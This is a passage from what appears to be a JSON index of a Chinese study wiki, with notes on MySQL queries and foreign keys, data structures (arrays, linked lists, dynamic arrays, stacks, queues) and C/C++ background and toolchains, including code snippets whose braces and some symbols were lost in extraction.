里又创建了两个更贴近业务建模的表： CREATE TABLE dep( did INT NOT NULL AUTO_INCREMENT, dname VARCHAR(20) NOT NULL, location VARCHAR(50) NOT NULL, manager VARCHAR(50) NOT NULL, PRIMARY KEY(did)); CREATE TABLE emp( eid INT NOT NULL AUTO_INCREMENT, name VARCHAR(20) NOT NULL, did INT NOT NULL, PRIMARY KEY(eid), FOREIGN KEY(did) REFERENCES dep(did)); 这里最重要的不是建了两个表，而是关系被明确写进了结构里： 表 关键字段 作用 dep did 部门主键 emp did 员工所属部门，作为外键引用部门表 一旦外键建立起来，数据库层面就开始帮助维护引用关系，而不只是靠应用代码“约定俗成”。 七、关系建模的关键不是表多，而是边界清楚把部门和员工拆成两张表，真正体现的是关系型数据库最重要的一层思想：不同实体分表存储，再通过键建立联系。 这背后解决的是几个非常实际的问题： 部门信息不需要在每个员工记录里重复写一遍 部门名称修改时，不必批量改员工表 查询时可以按关系重新拼接需要的数据 这也正是关系型数据库相比“把所有字段塞一张表里”更有结构感的地方。 八、继续写这类表时，最自然的查询通常就是连接查询例如部门和员工表一旦建好，最顺手的查询往往就是： SELECT e.name, d.dname, d.locationFROM emp eINNER JOIN dep d ON e.did = d.did; 这条语句本质上说明了一个很重要的事实：多表设计不是为了把数据拆散，而是为了在需要的时候更有规则地重新组合。 九、这一组 SQL 真正带来的提升，是从“查一张表”走向“理解关系”把 6 月 25 日这组练习串起来看，会发现主线非常清晰： 先学结果集合并- 再学两张表怎么连- 再学主键、复合主键和外键- 最后开始理解关系型数据库为什么叫“关系型” 数据库学习走到这里，重点已经不再是记住几个关键字，而是开始真正具备数据建模和多表思维。这一步跨过去，后面的子查询、视图、索引、事务、范式设计，都会更容易理解。","tags":[null,null,null,null]},{"title":"整数编码、字符编码与数组","path":"/wiki/datastructure/datastructure-01.html","content":"有符号整数、字符和数组在内存中都表现为位与字节。整数编码决定固定位模式如何解释为数值，字符编码建立码点与字节之间的映射，数组则规定一组同类型元素的连续布局。 有符号整数的补码表示原码、反码和补码常用于解释定长有符号整数的二进制表示。以 8 位整数为例，最高位参与符号表示，其余位与它共同确定数值。 正数的原码、反码和补码相同。 负数的反码可由原码保持符号位、其余位取反得到。 负数的补码可由反码加 1 得到。 这种转换关系适合手工推导，但不表示处理器会在每次运算前后把数据转换成原码。现代通用处理器通常直接对固定位宽的补码执行算术运算。 Java 的 byte 是 8 位有符号整数，取值范围为 -128 到 127： 位模式 十进制值 0000 0000 0 0111 1111 127 1111 1111 -1 1000 0000 -128 8 位编码一共有 256 种状态。补码只保留一个零，因此正数有 127 个，负数有 128 个；1000 0000 对应 -128，不存在与它对称的 +128。 浮点数的范围与精度Java 的 int 和 float 都占 32 位，但位的用途不同。int 直接表示整数，float 采用 IEEE 754 单精度格式，由符号位、指数部分和有效数字部分组成。 指数扩大了可表示的数量级，有效数字位数则限制了精度。因此，浮点数“范围更大”不等于“能精确表示更多整数或小数”。32 位 float 通常只有约 7 位十进制有效数字。 这项结论不能直接套到所有 C++ 实现。C++ 基本类型的具体大小与实现有关，应通过目标平台的编译器和 sizeof 确认。 字符集与字符编码字符集定义可使用的字符及其编号，字符编码规定这些编号如何转换成字节。把二者混为一谈，容易误判乱码发生的位置。 ASCIIASCII 的全称是 American Standard Code for Information Interchange。它使用 7 位编码 128 个字符，包括英文字母、数字、标点和控制字符。 后来出现过多种利用第 8 位的单字节编码，它们常被统称为“扩展 ASCII”，但并不是一套统一编码，不能只凭这个名称判断字节含义。 GBKGBK 扩展自 GB2312。兼容 ASCII 的字符通常使用一个字节，汉字等字符通常使用两个字节。程序出现中文乱码时，常见原因是写入端与读取端使用了不同编码，而不是某个编辑器必须固定使用 GBK。 Unicode 与 UTFUnicode 为字符分配统一的码点，例如字母 A 的码点是 U+0041。UTF-8、UTF-16 和 UTF-32 是把 Unicode 码点编码为字节或代码单元的不同方案。 编码 特征 UTF-8 变长编码，每个码点使用 1 到 4 个字节；ASCII 字节保持兼容 UTF-16 一个码点通常使用 1 个或 2 个 16 位代码单元 UTF-32 每个码点使用一个 32 位代码单元，定位直接但空间开销较大 2025-01-22：学习到“编程语言中的字符编码”时，源文件编码、运行时字符串表示和终端输出之间的关系还没有理清。 这三个层次不能混用：源文件编码决定编译器如何读取代码文本；运行时字符串由语言和实现定义；终端与文件则按照各自配置完成字节转换。Unicode 与 UTF 只解决其中的字符编号和编码表示问题。 数组的连续存储数组把相同类型的元素放在一段连续内存中，并用索引表示元素相对首地址的位置。对元素类型 T，索引 i 对应的地址可以抽象为： address(array[i]) = base_address + i * sizeof(T) 地址计算只包含固定次数的算术操作，因此按索引访问的时间复杂度为 O(1)。索引是相对位置，不是内存地址本身。 C++ 数组初始化int uninitialized[5]; // 自动存储期下，元素值未初始化int zeros[5]; // 所有元素初始化为 0int values[5]1, 3, 2, 5, 4;int* dynamicZeros = new int[5];delete[] dynamicZeros; “未指定初值时默认为 0”不是 C++ 的通用规则。上面的 uninitialized 不会自动得到全零元素，初始化行为取决于存储期和初始化语法。 数组操作的复杂度 操作 典型复杂度 条件 按索引访问 O(1) 索引有效 线性查找 O(n) 未利用有序性或额外索引 中间插入 O(n) 后续元素需要移动 中间删除 O(n) 后续元素需要前移 复制到更大空间 O(n) 静态容量不足或动态数组扩容 固定数组的容量不能在原位置增长。若已使用长度小于容量，插入可以利用空余位置；只有容量已满而代码仍强行写入时，才会越界或需要舍弃元素。动态数组会申请更大的连续空间，再迁移已有元素。","tags":[null,null,null,null]},{"title":"MySQL笔记02","path":"/wiki/database/mysql-note-02.html","content":"真正让 SQL 变得有力量的，不是 SELECT 本身，而是“如何把要的数据筛出来”。条件查询、模糊匹配、排序、分页、聚合与分组，基本构成了数据库查询阶段最核心的能力。 一、先理解查询不是“把表全拿出来”从这组 SQL 开始，重点已经不再是建表，而是怎样从已有数据里精准拿到想要的结果。 SELECT name, age FROM stu;SELECT DISTINCT address FROM stu;SELECT name AS 姓名, math AS 数学成绩, english AS 英语成绩 FROM stu; 这一阶段最重要的意识是：查询并不一定返回整张表，而是根据当前问题挑字段、挑范围、挑顺序。 二、WHERE 是条件查询的真正入口最常见的比较条件，在这一组 SQL 里都出现了： SELECT * FROM stu WHERE age 20;SELECT * FROM stu WHERE age = 20 AND age = 30;SELECT * FROM stu WHERE age BETWEEN 10 AND 50;SELECT * FROM stu WHERE age 18;SELECT * FROM stu WHERE english IS NULL; 比较条件最适合先按类型理解： 类型 代表写法 作用 比较运算 、=、=、 比较单个值 逻辑运算 AND、OR 组合多个条件 范围判断 BETWEEN ... AND ... 判断是否落在区间内 集合判断 IN (...) 判断是否属于某一组值 空值判断 IS NULL IS NOT NULL 处理空值 AND 和 OR 的差别不是语法，而是结果范围SELECT * FROM stu WHERE age = 20 AND age = 30;SELECT * FROM stu WHERE age = 18 OR age = 20 OR age = 22; 可以把它们理解成： AND 是“同时满足” OR 是“满足其一即可” 这也是为什么条件一复杂，最好加上括号，让逻辑边界更清晰。 IN 常常比连续多个 OR 更清爽SELECT * FROM stu WHERE age IN (18, 20, 22);SELECT * FROM stu WHERE age NOT IN (18, 20, 22); 当条件本质上是“属于某一组值”时，IN 的可读性通常比多个 OR 更高。 三、LIKE 和 REGEXP 是两种不同层次的模糊匹配这一组 SQL 很适合拿来比较它们的差异。 LIKE 更像简单通配SELECT * FROM stu WHERE name LIKE 马%;SELECT * FROM stu WHERE name LIKE _花%;SELECT * FROM stu WHERE name LIKE %德%; LIKE 的通配规则最常用的是： 写法 含义 % 任意长度字符 _ 单个字符 REGEXP 更像模式匹配SELECT * FROM stu WHERE name REGEXP ^马;SELECT * FROM stu WHERE name REGEXP ^[马柳];SELECT * FROM stu WHERE age REGEXP ^[0-9]2$; 当条件从“模糊包含”升级到“满足某种字符规则”时，正则会明显更强。 LIKE 和 REGEXP 怎么选 场景 更适合的写法 前缀、后缀、包含查询 LIKE 指定模式、字符集合、长度规则 REGEXP 如果只是日常业务筛选，LIKE 往往已经够用；一旦要按更复杂的字符串规律匹配，REGEXP 的表达力会更强。 四、排序不是附属功能，而是结果组织方式SELECT id, name, math FROM stu ORDER BY math;SELECT id, name, math FROM stu ORDER BY math DESC;SELECT id, name, age, mathFROM stuORDER BY age ASC, math DESC; 排序真正解决的问题是：查询结果以什么顺序展示。 多字段排序的关键在优先级ORDER BY age ASC, math DESC; 这句话的意思不是两个字段“同时等权排序”，而是： 先按 age 排 如果 age 相同，再按 math 排 这个优先级意识非常重要，因为很多报表和列表页都是这么组织数据的。 COLLATE 会影响文本排序规则SELECT id, name FROM stuORDER BY name COLLATE utf8mb4_unicode_ci; 这说明文本排序并不只是“按字符大小比较”，而是受字符集和排序规则影响。中文、大小写、重音字符的排序行为，都可能跟这里有关。 五、LIMIT 把查询真正带进了分页思维SELECT id, name FROM stuORDER BY idLIMIT 3, 3; LIMIT 常见有两种理解方式： 写法 含义 LIMIT n 取前 n 行 LIMIT offset, size 从偏移量开始取 size 行 这也是大多数后台分页的起点。前端传页码和每页数量，后端最终都会落到类似的限制逻辑上。 六、聚合函数开始让查询从“取记录”变成“算结果”SELECT COUNT(*) AS total_line, COUNT(address) AS add_not_null, SUM(math) AS sum_math, AVG(english) AS avg_english, MAX(age) AS max_age, MIN(age) AS min_ageFROM stu; 这一组函数可以分成两类理解： 函数 作用 COUNT 计数 SUM 求和 AVG 求平均值 MAX 取最大值 MIN 取最小值 COUNT(*) 和 COUNT(col) 不能混着理解 写法 含义 COUNT(*) 统计行数 COUNT(address) 只统计该列不为 NULL 的行 这个差别在业务统计里非常关键。 七、GROUP BY 让“整体统计”变成“分组统计”SELECT sex, COUNT(*) AS total_students, ROUND(AVG(age), 1) AS avg_ageFROM stuGROUP BY sex; 这里最值得理解的是：GROUP BY 不是简单排序，而是在“按某个字段把数据分桶”，每一桶再做统计。 多字段分组意味着分组键更细SELECT sex, address, ROUND(AVG(math), 2) AS avg_mathFROM stuGROUP BY sex, address; 当分组键从一个字段变成两个字段时，统计颗粒度会更细。 八、HAVING 和 WHERE 的差别一定要分清SELECT sex, address, ROUND(AVG(math), 2) AS avg_mathFROM stuGROUP BY sex, addressHAVING avg_math = 80; 最适合记忆的方式就是这一句： WHERE 过滤行，HAVING 过滤组。 更直观一点可以看下面这张表： 关键字 作用阶段 是否常与聚合函数一起出现 WHERE 分组前 一般不直接对聚合结果过滤 HAVING 分组后 常用于过滤聚合后的结果 九、这一组查询语句最值得建立的是“执行顺序感”很多 SQL 一旦写长，就会开始混乱。这个时候最有帮助的不是继续背新语法，而是建立查询执行顺序的直觉。 一个常见的理解顺序可以先这样记： FROM- WHERE- GROUP BY- HAVING- SELECT- ORDER BY- LIMIT 这条线一旦顺了，再回头看条件查询、分组统计、分页限制，就不会觉得它们是孤立知识点，而会知道它们分别在查询过程的哪个环节起作用。","tags":[null,null,null,null]},{"title":"单向链表的节点结构","path":"/wiki/datastructure/datastructure-02.html","content":"链表同样表示有序的线性数据，但它不要求元素位于连续内存。单向链表中的每个节点保存一个值，以及指向后继节点的指针或引用。 节点之间的关系单向链表通常包含以下概念： 头节点：链表的第一个节点，也是遍历入口。 尾节点：链表的最后一个节点，其后继为空。 后继指针或引用：保存下一个节点的位置或对象引用。 head | v[value | next] - [value | next] - [value | null] 不同语言表示“空后继”的写法不同：C 使用 NULL，现代 C++ 使用 nullptr，Java 使用 null，Python 使用 None。 链表节点可以分散在内存中。节点之间依靠指针或引用建立逻辑顺序，因此访问第 i 个节点时需要从头节点沿链接逐步移动。 不同语言的节点定义C++ struct ListNode int value; ListNode* next; explicit ListNode(int value) : value(value), next(nullptr) ; C #include stdlib.htypedef struct ListNode int value; struct ListNode* next; ListNode;ListNode* create_node(int value) ListNode* node = malloc(sizeof(*node)); if (node == NULL) return NULL; node-value = value; node-next = NULL; return node; Java class ListNode int value; ListNode next; ListNode(int value) this.value = value; this.next = null; Python 3.10+ from __future__ import annotationsclass ListNode: def __init__(self, value: int) - None: self.value = value self.next: ListNode | None = None 这些定义表达的是同一结构。C 和 C++ 保存内存地址，Java 和 Python 保存对象引用；具体的内存管理方式由语言和实现决定。 建立一条链下面的 C++ 代码把三个已经存在的节点连接成 1 - 3 - 2： ListNode first1;ListNode second3;ListNode third2;first.next = second;second.next = third;ListNode* head = first; 初始化链表包含两件事：创建节点，以及建立节点之间的链接。动态分配节点时还需要定义所有权和释放方式，否则链表销毁时会泄漏内存。 链表的空间特征数组只存放元素本身，单向链表还要为每个节点保存一个后继指针。链表因此带有额外空间开销，节点分散分配时也会受到分配器元数据和内存对齐影响。 这项开销换来的是节点级扩展能力：新增节点不要求重新申请一整段连续空间。链表适合频繁调整链接关系的场景，但并不自动意味着所有插入、删除操作都是 O(1)；能否直接拿到目标位置的前驱节点，是复杂度判断的一部分。","tags":[null,null,null]},{"title":"单向链表的插入、删除与访问","path":"/wiki/datastructure/datastructure-03.html","content":"单向链表的插入和删除都围绕后继指针展开，但两种操作的更新顺序不同，复杂度也取决于是否已经取得前驱节点。 在已知节点后插入假设 current 是链表中的节点，node 是待插入节点。更新顺序不能颠倒：先让新节点指向原后继，再修改当前节点的后继。 插入前：current - next插入后：current - node - next void insert_after(ListNode* current, ListNode* node) if (current == nullptr || node == nullptr) return; node-next = current-next; current-next = node; def insert_after(current: ListNode, node: ListNode) - None: node.next = current.next current.next = node 当前驱节点和待插入节点已经取得时，修改链接只需要固定次数操作，复杂度为 O(1)。若调用者只提供索引，仍需先从头遍历到对应位置，完整操作为 O(n)。 删除已知节点的后继单向链表无法从当前节点直接向前移动，因此常见接口是“删除某个节点之后的节点”。 删除前：current - removed - next删除后：current ---------- next void remove_after(ListNode* current) if (current == nullptr || current-next == nullptr) return; ListNode* removed = current-next; current-next = removed-next; delete removed; def remove_after(current: ListNode) - None: if current.next is None: return current.next = current.next.next C++ 示例假设被删除节点由 new 创建，并由当前链表负责释放。若节点使用其他所有权模型，释放方式也要相应调整。Python 对象在没有引用后由垃圾回收机制处理，代码只修改链接。 访问、查找与复杂度按索引访问时，程序从头节点向后移动，直到到达目标位置： ListNode* access(ListNode* head, int index) if (index 0) return nullptr; for (int i = 0; i index head != nullptr; ++i) head = head-next; return head; 访问头节点是 O(1)；访问任意索引最坏需要经过整条链，因此是 O(n)。与数组不同，链表不能通过首地址和偏移量直接计算目标节点地址。 按值查找也需要沿链表逐个比较： int find(ListNode* head, int target) int index = 0; while (head != nullptr) if (head-value == target) return index; head = head-next; ++index; return -1; 线性查找的最坏时间复杂度为 O(n)，额外空间复杂度为 O(1)。 操作 已知前驱节点 只给定索引 插入后继 O(1) O(n) 删除后继 O(1) O(n) 访问节点 - O(n) 按值查找 - O(n) “链表插入和删除是 O(1)”只描述修改链接的部分。定位目标位置所需的遍历不能从完整操作中省略。","tags":[null,null,null]},{"title":"动态数组与列表操作","path":"/wiki/datastructure/datastructure-05.html","content":"列表表示一组有序元素以及访问、修改、插入、删除和遍历等操作。它是一种抽象接口，可以由动态数组、链表或其他结构实现；动态数组只是列表的一种实现方式。 长度与容量动态数组通常维护两个数值： 长度（size）：当前有效元素数量。 容量（capacity）：已分配空间能够容纳的元素数量。 尾部追加时，如果长度小于容量，只需写入下一个位置；容量不足时，容器会申请更大的连续空间并迁移元素。单次扩容是 O(n)，采用倍增策略后，连续多次尾部追加的均摊复杂度通常为 O(1)。 中间插入和删除仍需移动后续元素，因此是 O(n)。动态扩容解决的是容量限制，没有改变连续存储的移动成本。 操作 典型复杂度 按索引访问或修改 O(1) 尾部追加 均摊 O(1) 尾部删除 O(1) 中间插入或删除 O(n) 线性查找 O(n) 标准容器中的常见操作C++ 的 std::vector 提供连续存储的动态数组： #include algorithm#include vectorstd::vectorint nums1, 3, 2, 5, 4;nums.push_back(6);nums.insert(nums.begin() + 2, 7);nums.erase(nums.begin() + 2);std::vectorint other8, 9;nums.insert(nums.end(), other.begin(), other.end());std::sort(nums.begin(), nums.end()); Python 的 list 提供相近的序列操作；下面的行为以常见的 CPython 实现为背景： nums = [1, 3, 2, 5, 4]nums.append(6)nums.insert(2, 7)nums.pop(2)nums.extend([8, 9])nums.sort() 两段代码的接口相似，但语言规范、元素表示、内存模型和扩容策略并不相同。跨语言比较时不应只凭方法名称推断底层实现。 一个简化的动态数组下面的 C++14 示例实现容量、长度、扩容、插入和删除，并使用 std::unique_ptr 管理内部数组，避免手写析构和浅拷贝问题。示例没有实现迭代器、复制语义和完整的异常保证。 #include cstddef#include memory#include stdexceptclass IntList private: std::size_t size_ = 0; std::size_t capacity_ = 4; std::unique_ptrint[] data_ = std::make_uniqueint[](capacity_); void grow() const std::size_t newCapacity = capacity_ * 2; auto replacement = std::make_uniqueint[](newCapacity); for (std::size_t i = 0; i size_; ++i) replacement[i] = data_[i]; data_ = std::move(replacement); capacity_ = newCapacity; public: std::size_t size() const return size_; std::size_t capacity() const return capacity_; int at(std::size_t index) if (index = size_) throw std::out_of_range(index out of range); return data_[index]; void push_back(int value) if (size_ == capacity_) grow(); data_[size_++] = value; void insert(std::size_t index, int value) if (index size_) throw std::out_of_range(index out of range); if (size_ == capacity_) grow(); for (std::size_t i = size_; i index; --i) data_[i] = data_[i - 1]; data_[index] = value; ++size_; int erase(std::size_t index) if (index = size_) throw std::out_of_range(index out of range); const int removed = data_[index]; for (std::size_t i = index; i + 1 size_; ++i) data_[i] = data_[i + 1]; --size_; return removed; ; 扩容时先申请新数组，再复制有效元素并替换旧存储。中间插入从后向前移动，避免尚未复制的值被覆盖；删除则从前向后填补空位。","tags":[null,null,null]},{"title":"数组与链表的存储特征","path":"/wiki/datastructure/datastructure-04.html","content":"数组和链表都能表示线性序列，但二者使用不同的物理存储结构。数组依赖连续内存和索引计算，链表依赖分散节点与链接关系。操作复杂度必须连同定位方式一起讨论。 存储与操作对比 特征 数组 单向链表 内存布局 元素连续存放 节点可以分散存放 额外空间 主要是元素本身，可能预留未使用容量 每个节点还要保存后继指针及对齐空间 按索引访问 O(1) O(n) 按值线性查找 O(n) O(n) 在已知位置插入 移动后续元素，O(n) 已知前驱节点时修改链接，O(1) 在已知位置删除 移动后续元素，O(n) 已知前驱节点时修改链接，O(1) 容量变化 静态数组固定；动态数组可能整体迁移 按节点申请或释放内存 缓存局部性 通常较好 通常较弱 表中的链表插入、删除复杂度只计算修改链接的过程。若输入是索引或目标值，定位前驱节点仍需 O(n)。头部插入是常见的 O(1) 特例，因为头指针已经提供了位置。 数组扩容也要区分静态数组和动态数组。静态数组容量固定；std::vector、Java ArrayList 等动态数组会在容量不足时申请更大空间并迁移元素。 链表的常见形式 单向链表：节点只保存后继链接，遍历方向固定。 双向链表：节点同时保存前驱和后继链接，可以向两个方向遍历，但每个节点占用更多空间。 环形链表：尾节点链接回某个已有节点；在标准环形链表中通常链接回头节点，因此不存在 null 结尾。 这些形式改变了可用操作和维护成本。例如，双向链表在已知目标节点时可以直接访问前驱，删除操作不必额外寻找前一个节点；代价是每次插入、删除都要维护更多链接。 结构选择选择数组时，常见依据是频繁按索引读取、元素数量相对稳定，以及对缓存局部性有要求。选择链表时，常见依据是节点数量变化频繁、操作位置已经由节点引用给出，或者无法取得足够大的连续内存。 实际性能还会受到元素大小、内存分配器、缓存层级和访问模式影响。复杂度描述增长趋势，不能替代目标环境中的测量。","tags":[null,null,null,null]},{"title":"内存局部性、栈、队列与双端队列","path":"/wiki/datastructure/datastructure-06.html","content":"数组和链表的内存布局会影响缓存访问。在线性结构上限制元素插入和删除的位置，又会分别形成栈、队列与双端队列等抽象接口。 存储层次与缓存局部性处理器缓存、主内存和持久化存储在容量、延迟和断电保持能力上不同： 层次 典型用途 特征 CPU 缓存 保存近期或邻近访问的数据 容量小、延迟低，通常由硬件管理 主内存 保存正在运行的程序和数据 容量较大，断电后内容丢失 SSD 硬盘 长期保存程序和文件 容量大、访问延迟高，断电后保留数据 CPU 通常以缓存行为单位在缓存和主内存之间传输数据。连续遍历数组会依次访问相邻地址，容易利用空间局部性和硬件预取。链表节点可能分散在不同地址，遍历时需要先读取当前节点才能得到后继地址，缓存命中率通常低于连续数组。 数组也可能预留未使用容量，链表则要为每个节点保存链接并承担分配器与内存对齐开销。两者的实际空间效率取决于元素大小、容量策略和分配方式，不能只用“连续”或“分散”得出绝对结论。 栈栈（stack）遵循后进先出（LIFO）顺序。插入和删除都发生在栈顶。 操作 含义 典型复杂度 push 向栈顶添加元素 O(1) pop 删除栈顶元素 O(1) top 读取栈顶元素 O(1) 栈可以由链表或动态数组实现。使用链表时通常把头节点作为栈顶；使用动态数组时把数组尾部作为栈顶，从而避免移动其他元素。 #include stdexcept#include vectorclass ArrayStack private: std::vectorint data_; public: bool empty() const return data_.empty(); void push(int value) data_.push_back(value); int top() const if (empty()) throw std::out_of_range(stack is empty); return data_.back(); int pop() const int value = top(); data_.pop_back(); return value; ; 队列队列（queue）遵循先进先出（FIFO）顺序。元素从队尾进入，从队首离开。 操作 含义 典型复杂度 push 向队尾添加元素 O(1) pop 删除队首元素 O(1) front 读取队首元素 O(1) 链式队列同时保存队首和队尾指针。下面的实现沿用前文 ListNode，并在最后一个节点出队后把 rear_ 重置为空，避免它继续指向已经释放的节点。 #include cstddef#include stdexceptclass LinkedQueue private: ListNode* front_ = nullptr; ListNode* rear_ = nullptr; std::size_t size_ = 0; public: ~LinkedQueue() while (front_ != nullptr) ListNode* removed = front_; front_ = front_-next; delete removed; bool empty() const return size_ == 0; void push(int value) ListNode* node = new ListNode(value); if (rear_ == nullptr) front_ = node; rear_ = node; else rear_-next = node; rear_ = node; ++size_; int front() const if (empty()) throw std::out_of_range(queue is empty); return front_-value; int pop() const int value = front(); ListNode* removed = front_; front_ = front_-next; delete removed; --size_; if (front_ == nullptr) rear_ = nullptr; return value; ; 环形数组 2025-02-07：学习基于数组的队列时，环形索引的回绕以及空队列、满队列的判断没有理清。 普通数组如果每次出队都移动剩余元素，操作会退化为 O(n)；环形数组通过两个索引避免搬移： front = 当前队首索引rear = 下一个可写位置入队后：rear = (rear + 1) % capacity出队后：front = (front + 1) % capacity 取模让索引到达数组末尾后回到开头。实现时还要保存元素数量，或预留一个空槽，才能区分“空队列”和“满队列”。完整实现还需要处理扩容、异常和索引有效性。 双端队列双端队列（deque）允许在队首和队尾执行插入、删除和读取。它可以模拟栈，也可以模拟普通队列。 抽象操作 含义 典型复杂度 push_front 在队首添加元素 O(1) push_back 在队尾添加元素 O(1) pop_front 删除队首元素 O(1) pop_back 删除队尾元素 O(1) front 读取队首元素 O(1) back 读取队尾元素 O(1) 表中是抽象操作名称，具体标准库可能采用不同接口。哈希算法和堆操作可以通过数据结构可视化站点交互观察。","tags":[null,null,null,null,null]},{"title":"C 与 C++ 的关系","path":"/wiki/cpp/cpp-note-02.html","content":"C++ 从 C 的语法和系统编程传统中发展而来，但二者拥有各自的标准、类型规则和语言演进路线。把 C++ 简化为“带有类的 C”，会忽略模板、RAII、标准库和现代类型系统等组成部分。 C 的系统编程基础Dennis Ritchie 于 20 世纪 70 年代初在贝尔实验室开发 C。C 能够直接描述指针、内存布局和底层数据操作，同时又比汇编语言更适合组织大型程序，因此广泛用于操作系统、编译器、嵌入式软件和基础库。 C 在 1989 年形成 ANSI C（C89），随后由 ISO 采纳为 C90。后续标准继续增加语言与标准库能力，但 C 的主要抽象仍围绕基本类型、结构体、函数和指针展开。 C++ 的扩展方向Bjarne Stroustrup 于 1979 年开始开发 “C with Classes”，后来演变为 C++。早期扩展集中在类、封装、继承和多态；后续标准加入并完善了模板、异常、标准模板库、移动语义、并发支持、概念和模块等能力。 现代 C++ 同时支持多种编程方式： 过程式代码适合直接表达控制流程和数据变换。 类可以把状态、不变量和行为组织在同一类型中。 模板支持基于类型和编译期信息的泛型编程。 RAII 把资源释放与对象生命周期绑定。 标准库提供容器、算法、字符串、并发和文件系统等通用组件。 面向对象只是其中一部分，不适合用来概括整门语言。 兼容关系的边界大量 C 代码可以经过少量调整后作为 C++ 编译，但 C++ 不是 C 的严格超集。两种语言在隐式类型转换、关键字、初始化规则、函数声明、字符串字面量类型和部分标准特性上存在差异。 例如，C 允许把 void* 隐式转换为其他对象指针，C++ 要求显式转换；C99 的某些语言特性也没有以相同形式进入 C++。同一文件能否同时通过 C 和 C++ 编译，需要按两套标准分别确认。 跨语言接口通常使用明确的 ABI 边界。C++ 调用 C 接口时常见 extern C，它主要影响语言链接和名称修饰，不会自动解决结构体布局、调用约定或所有平台兼容问题。 资源管理与运行风险C 通常通过成对函数管理资源，例如 malloc free、fopen fclose。C++ 可以继续调用这些接口，也可以利用构造函数、析构函数和 RAII 类型把资源生命周期绑定到作用域。 #include fstreamvoid write_log() std::ofstream fileapp.log; file started ; // file 离开作用域时关闭文件 语言不会阻止所有危险操作。数组越界、使用已经失效的对象、错误释放内存等行为可能触发未定义行为。现代 C++ 代码通常优先使用标准容器、智能指针和具有明确所有权的类型，减少裸资源管理范围。","tags":[null,null]},{"title":"C++ 开发工具链与 IDE","path":"/wiki/cpp/cpp-note-04.html","content":"C++ 开发环境由多个工具组成。IDE 可以把这些工具放进同一个界面，但源代码仍由编译器处理，项目依赖仍由构建系统编排，运行状态仍由调试器观察。 工具的职责 组件 职责 常见实现 编辑器 编辑、导航和格式化源代码 Visual Studio 编辑器、VS Code 编译器 预处理并编译翻译单元 MSVC、GCC、Clang 链接器 合并目标文件和库 link.exe、GNU ld、LLVM lld 构建系统 管理目标、依赖和编译参数 MSBuild、CMake、Ninja、Make 调试器 断点、单步、变量和调用栈 Visual Studio Debugger、GDB、LLDB IDE 集成编辑、构建、运行和调试入口 Visual Studio、CLion、Qt Creator 错误信息通常能反映问题所在阶段。语法或类型错误来自编译器；未解析的外部符号通常来自链接器；程序崩溃和逻辑偏差则发生在运行阶段。 Visual Studio 2022Visual Studio 是 Windows 上集成度较高的 C++ IDE。安装时需要在 Visual Studio Installer 中选择 Desktop development with C++ 工作负载，才能获得 MSVC 工具链和桌面 C++ 开发组件。只安装 IDE 外壳并不等于已经安装 C++ 编译器。 Microsoft 提供两种常见使用方式： 在 Visual Studio 中创建解决方案和项目，通过图形界面构建、运行和调试； 安装 Visual Studio 或 Build Tools 后，在 Developer Command Prompt 中直接调用 cl。 cl /EHsc hello.cpp MSVC 的头文件、库和工具依赖一组环境变量。Developer Command Prompt 会设置这些变量，普通命令提示符未必能直接找到 cl.exe 和对应 SDK。 当前安装方式可参考 Microsoft 的 Visual Studio C++ 支持安装说明。 VS Code 与独立工具链VS Code 是可扩展编辑器，不自带完整 C++ 编译工具链。CC++ 扩展可以提供代码补全、导航和调试适配，但本机仍需安装 MSVC、GCC 或 Clang，并配置构建任务与调试器。 在类 Unix 环境中，常见的单文件构建命令如下： g++ -std=c++20 -Wall -Wextra hello.cpp -o hello clang++ -std=c++20 -Wall -Wextra hello.cpp -o hello 命令中的标准版本和警告选项属于项目配置，应与代码要求、依赖和部署目标一致。真实项目通常交给 CMake、Meson 或其他构建系统管理，而不是长期手写每个编译命令。 在线编译环境在线工具适合验证小型、可公开的代码片段： 工具 用途 Compiler Explorer 比较不同编译器和参数生成的汇编 Wandbox 在浏览器中切换编译器版本并运行示例 OnlineGDB 运行和调试小型示例 在线环境的编译器版本、依赖、操作系统和资源限制与本地项目不同。包含隐私数据、凭据或未公开源码的代码不应上传到公共编译服务。 环境选择最终取决于目标平台。Windows 桌面项目可以使用 Visual Studio 与 MSVC；跨平台项目常用 CMake 配合 MSVC、GCC 或 Clang；只分析汇编时，Compiler Explorer 比完整 IDE 更直接。","tags":[null,null]},{"title":"程序、编程语言与执行平台","path":"/wiki/cpp/cpp-note-01.html","content":"C++ 源代码面向程序员书写，处理器执行的却是目标指令集中的机器指令。编译器、链接器、操作系统和运行库共同连接这两种表示形式。 程序与执行平台程序是一组数据和指令。源代码描述程序行为，构建工具把它转换成目标平台能够装载和执行的文件。 “平台”不只是操作系统名称，还包含处理器架构、可执行文件格式、应用二进制接口和运行库等条件。为 x86-64 Windows 构建的可执行文件，通常不能直接在 Arm64 Linux 上运行，因为二者的指令集和系统接口不同。 C++ 源代码- 编译与链接- 目标平台的可执行文件- 操作系统装载- 处理器执行机器指令 源代码可以具备跨平台能力，但二进制文件通常面向特定目标构建。可移植代码仍需要在各目标平台重新编译，并处理系统接口和依赖差异。 机器语言与汇编语言处理器按照指令集架构（Instruction Set Architecture，ISA）解释机器指令。x86-64、Arm64 等架构拥有不同的指令编码、寄存器和调用约定。 汇编语言用助记符表示机器指令。下面是一条 x86 汇编示例： mov al, 0x61 mov 表示数据传送操作，al 是寄存器名称，0x61 是十六进制立即数。汇编器会把这类文本转换为对应的机器码。汇编代码仍与目标架构紧密相关，不能脱离 ISA 解释。 高级语言的转换方式高级语言提供类型、函数、对象和控制结构等抽象，使代码不必直接描述寄存器和指令编码。高级语言程序仍要转换成处理器可执行的形式，常见实现会组合使用提前编译、解释执行和即时编译。 C++ 工具链通常采用提前编译：各源文件经过预处理和编译生成目标文件，链接器再把目标文件与所需库组合成程序。 .cpp 源文件- 预处理与编译- .obj / .o 目标文件- 链接器- 可执行文件或库 解释型和编译型不是所有语言都能严格二分的固定属性。JavaScript 引擎可以即时编译热点代码，Java 通常先生成字节码，再由运行时解释或即时编译。判断程序如何执行，应以具体语言实现和运行环境为准。 C++ 的抽象与控制范围C++ 提供函数、类、模板、标准库容器和算法等高层结构，也允许直接管理对象生命周期、内存布局和系统资源。这使它适合系统组件、实时程序、游戏引擎以及对性能和资源边界有明确要求的应用。 控制能力也带来额外约束。越界访问、悬空指针、对象生命周期错误和未定义行为可能通过编译，却在运行时产生不可预测结果。这些问题分别涉及构建配置、资源所有权和运行时行为。","tags":[null,null]},{"title":"第一个 C++ 程序：入口、标准输出与构建","path":"/wiki/cpp/cpp-note-05.html","content":"一个最小控制台程序已经包含源文件、头文件、入口函数、标准输出和构建产物。下面的示例不依赖特定 